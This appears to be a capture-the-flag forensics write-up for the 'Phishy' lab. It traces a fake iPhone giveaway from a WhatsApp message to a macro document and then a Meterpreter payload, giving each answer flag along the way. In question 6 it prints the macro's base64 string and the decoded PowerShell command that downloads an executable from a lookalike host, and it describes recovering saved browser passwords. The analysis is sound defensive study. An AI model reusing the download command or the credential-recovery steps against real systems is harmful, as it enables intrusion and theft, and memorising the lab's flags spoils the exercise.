# Phishy Challenge
![This is an image](/Phishy/Images/PhishyHead.png)

## Challenge Link
https://cyberdefenders.org/labs/60

## Challenge Information
- Image Size: 	889MB
- Image Format: .ad1
- Tags: 
    - AccessData 
    - Windows Forensics 
    - Macro 
    - Web Browsers 
    - Registry 
    - Timeline Analysis 
    - Messenger 

## Scenario
> A company’s employee joined a fake iPhone giveaway. Our team took a disk image of the employee's system for further analysis. As a security analyst, you are tasked to identify how the system was compromised.

## Tools Used
    • FTK Imager
        ◦ FTK® Imager is a data preview and imaging tool
    • Registry Explorer
        ◦ Registry Explorer is a very powerful and easy to use tool for traversing registry hives
    • SQLite Browser
        ◦ DB Browser for SQLite (DB4S) is a high quality, visual, open source tool to create, design, and edit database files compatible with SQLite.
    • browsinghistoryview
        ◦ BrowsingHistoryView is a utility that reads the history data of different Web browsers (Mozilla Firefox, Google Chrome, Internet Explorer, Microsoft Edge, Opera)
    • Mzcacheview
        ◦ MZCacheView is a small utility for Windows that reads the cache folder of Firefox Web browsers
    • passwordfox
        ◦ PasswordFox is a small password recovery tool that allows you to view the user names and passwords stored by Mozilla Firefox Web browser
    • Whatsapp viewer
        ◦ WhatsApp Viewer can be used to view WhatsApp chats on your PC. It has the ability to display chats from the Android msgstore.db file.
    • oledump
        ◦ oledump is a program to analyze OLE files (Compound File Binary Format). These files contain streams of data. oledump allows you to analyze these streams.
    • oletools
        ◦ oletools is a package of python tools to analyze Microsoft OLE2 files (also called Structured Storage, Compound File Binary Format or Compound Document File Format), such as Microsoft Office documents or Outlook messages
        


## Questions:
### 1.What is the hostname of the victim machine?
This data can be acquired from several places, we can get it from the SYSTEM registry hive
`HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\ComputerName\ComputerName`
Or you can just open any EVTX File (Windows Event Viewer) to see the hostname 
`\Windows\System32\winevt\Logs\System.evtx`

![q1](/Phishy/Images/q1.png)


> **Flag: WIN-NF3JQEU4G0T**

### 2.What is the messaging app installed on the victim machine?
I Look at the registry key that hold the list of installed software.
For 32bit system: `Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall`
For 64bit system: `Software\Microsoft\Windows\CurrentVersion\Uninstall`
But I didn't see nothing that related to messaging app
I assumed that user downloaded the messaging app from the internet, so i accessed his  download folder
`Users\Semah\Downloads`


![q2](/Phishy/Images/q2.png)


> **Flag: Whatsapp**


### 3.The attacker tricked the victim into downloading a malicious document. Provide the full download URL.
From look at `c:\users\Semah\appdata\local` I saw that mozilla firefox is installed so I used the tools `mzcacheview & mzhistoryview` to see the browser history and cache, I search for document evidence but nothing found
So I decide to recover WhatsApp massage the user received,
To do it I extracted the `msgstore.db` from WhatsApp database folder using `FTK IMAGER`
`\Users\Semah\AppData\Roaming\WhatsApp\Databases\`
I opened the file using the tool WhatsApp viewer and located the massage with the URL



![q3](/Phishy/Images/q3.png)


> **Flag: http://<i></i>appIe.com/IPhone-Winners.doc**

### 4.Multiple streams contain macros in the document. Provide the number of the highest stream.
To see all streams in the doc file I used `oledump` tool , the highest stream is 10


![q4](/Phishy/Images/q4.PNG)


> **Flag: 10**

### 5.The macro executed a program. Provide the program name?
I used `oletools` to investigate the doc file, to get additional info about the file I run `oleid.py`

![q5](/Phishy/Images/q5a.PNG)

Ok , so nothing new here ,we already know the doc contains macros, Next step is to get the macro code, I used `olevba.py`

![q5](/Phishy/Images/q5b.PNG)

Now we can see the macro, but the code is obfuscated with characterstring obfuscation, so lets add the option `–-deobf` to `olevba.py` to deobfuscation the code

![q5](/Phishy/Images/q5c.PNG)

Its works, now we can see much clearer view about what the macro is doing, he executed a powershell program

> **Flag: Powershell**

### 6.The macro downloaded a malicious file. Provide the full download URL.

After we deobfuscation the code we also see a string that look like `base64` encoding

![q6a](/Phishy/Images/q6a.png)

### Base64 string
`aQBuAHYAbwBrAGUALQB3AGUAYgByAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcAA6AC8ALwBhAHAAcABJAGUALgBjAG8AbQAvAEkAcABoAG8AbgBlAC4AZQB4AGUAJwAgAC0ATwB1AHQARgBpAGwAZQAgACcAQwA6AFwAVABlAG0AcABcAEkAUABoAG8AbgBlAC4AZQB4AGUAJwAgAC0AVQBzAGUARABlAGYAYQB1AGwAdABDAHIAZQBkAGUAbgB0AGkAYQBsAHMA`

Lets try to decode the string to see what we get, I use `CyberChef` to decode the string

![q6](/Phishy/Images/q6.PNG)

### The decode string
`invoke-webrequest -Uri 'http://appIe.com/Iphone.exe' -OutFile 'C:\Temp\IPhone.exe' -UseDefaultCredentials`

Lets analyze the powershell command(From https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2)

invoke-webrequest
> The Invoke-WebRequest cmdlet sends HTTP and HTTPS requests to a web page or web service

-Uri
> Specifies the Uniform Resource Identifier (URI) of the internet resource to which the web request is sent. Enter a URI. 

-OutFile
> Specifies the output file for which this cmdlet saves the response body. Enter a path and file name
>
-UseDefaultCredentials
> Indicates that the cmdlet uses the credentials of the current user to send the web request. 


In simple words the powershell command is used to download a file from the internet and save it on disk

The full url is http://<i></i>appIe.com/Iphone.exe

> **Flag: http://<i></i>appIe.com/Iphone.exe**

### 7.Where was the malicious file downloaded to? (Provide the full path)

From the powershell command 
`invoke-webrequest -Uri 'http://appIe.com/Iphone.exe' -OutFile 'C:\Temp\IPhone.exe' -UseDefaultCredentials`

The output folder of the malicious file is `C:\Temp\IPhone.exe`
> **Flag: C:\Temp\IPhone.exe**

### 8.What is the name of the framework used to create the malware?

This one was little tricky, I tried to use tools like detect it easy and even used `IDA pro` and i didn’t get any clue about the framework, so I decide to search the MD5 on `virustotal` to see what I get
### MD5
> 7C827274C062374E992EB8F33D0C188C

![q8](/Phishy/Images/q8.PNG)

Well it's helped more I could ask, the file was recognize as `Meterpreter`

> Meterpreter is a Metasploit Framework attack payload that provides an interactive shell

> **Flag: Metasploit**

### 9.What is the attacker's IP address?
The report on `Virustotal` indicated the file is contacted to ip address 155.94.69.27

![q9](/Phishy/Images/q9.PNG)

> **Flag: 155.94.69.27**

### 10.The fake giveaway used a login page to collect user information. Provide the full URL of the login page? 

I tried to look at firefox history using `mzhistoryview` and `BrowsingHistoryView` to locate the login page, I tried some words the usually used on login page but I didn't find anything, so I decide to look at the firefox bookmarks
Firefox Bookmarks are stored in file `places.sqlite` its sqlite3 database, within the `moz_bookmarks` table. Associated URL information is stored within the `moz_places` table.

I open the file `places.sqlite` with `SQLiteDatabaseBrowser`

![q10](/Phishy/Images/q10.png)

The fake giveaway URL is http://<i></i>appIe.competitions.com/login.php

> **Flag: http://<i></i>appIe.competitions.com/login.php**

### 11.What is the password the user submitted to the login page?
Because it login page, maybe the user has saved the login credentials
The saved credentials are stored in `logins.json` file
### Path
`\Users\Semah\AppData\Roaming\Mozilla\Firefox\Profiles\pyb51x2n.default-release\`

I try to open the file with `notepad++` but the password is encrypted using Triple DES Encryption in CBC mode.
So I used `passwordfox` to see it in clear text

![q11](/Phishy/Images/q11.png)

> **Flag: GacsriicUZMY4xiAF4yl**
